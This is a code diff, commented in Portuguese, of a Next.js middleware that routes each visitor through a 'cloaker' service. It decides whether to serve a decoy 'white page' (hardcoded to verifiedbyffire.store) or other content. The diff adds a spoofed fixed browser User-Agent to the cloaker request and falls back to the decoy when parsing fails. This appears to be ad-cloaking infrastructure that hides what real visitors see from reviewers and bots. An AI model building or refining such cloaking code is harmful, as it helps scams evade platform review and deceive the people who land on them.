@@ -77,35 +77,46 @@ export async function middleware(request: NextRequest) {
       url: request.nextUrl.pathname + request.nextUrl.search
     })
 
-    // Fazer requisição para o cloaker (igual ao PHP)
+    // Fazer requisição para o cloaker (EXATAMENTE como o PHP)
     const formBody = new URLSearchParams(serverData as any).toString()
     
     const response = await fetch(CLOAKER_CONFIG.url, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': serverData.HTTP_USER_AGENT
+        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:135.0) Gecko/20100101 Firefox/135.0',
+        'Accept-Encoding': 'gzip, deflate, br'
       },
       body: formBody
     })
 
     let result: { type: string; url: string; result?: string; action?: string; reason?: number }
 
-    if (response.ok) {
-      result = await response.json()
-      console.log('📥 [Cloaker] Resposta:', {
-        type: result.type,
-        result: result.result,
-        action: result.action,
-        reason: result.reason,
-        url: result.url
-      })
+    const responseText = await response.text()
+    
+    if (responseText && responseText.trim()) {
+      try {
+        result = JSON.parse(responseText)
+        console.log('📥 [Cloaker] Resposta:', {
+          type: result.type,
+          result: result.result,
+          action: result.action,
+          reason: result.reason,
+          url: result.url
+        })
+      } catch (e) {
+        console.log('⚠️ [Cloaker] Erro ao parsear JSON - usando fallback (white)')
+        result = {
+          type: 'white',
+          url: 'https://verifiedbyffire.store/'
+        }
+      }
     } else {
-      console.log('⚠️ [Cloaker] Falha na API - usando fallback (white)')
-      // Fallback: se o cloaker falhar, mostrar white page
+      console.log('⚠️ [Cloaker] Resposta vazia - usando fallback (white)')
+      // Fallback IGUAL ao PHP: se vazio, mostrar white page
       result = {
         type: 'white',
-        url: CLOAKER_CONFIG.whitePagePath
+        url: 'https://verifiedbyffire.store/'
       }
     }
 
